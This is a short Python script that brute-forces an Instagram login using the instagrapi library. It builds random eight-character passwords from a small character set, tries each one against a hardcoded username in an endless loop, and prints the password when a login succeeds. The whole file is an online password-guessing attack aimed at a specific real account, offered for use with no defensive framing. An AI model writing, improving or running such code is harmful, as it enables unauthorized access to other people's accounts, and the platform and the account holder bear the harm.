from random import randint
from instagrapi import Client
password_already_used = []
def  password_cracker():
    caracteres_possibles = ['y','a','h','Y','A','H','1','2','3','4','5','6','7','8', '9']
    password = ""
    for i in range(8):
        num = randint(0, len(caracteres_possibles)-1)
        car = caracteres_possibles[num]
        password = password+car
        
    if password in password_already_used:
        return False
    else:
        password_already_used.append(password)
        return password
def password():
    result = False
    user = "yahyara129"
    password = password_cracker()
    client = Client()
    if password == False:
        pass
    else:
        try:
            client.login(user,password)
            print("password is :"+password)
            result = True
        except:
            print("try:" +password)
            result = False
    return result
result = False
while result == False:
    result = password()
    print(result)




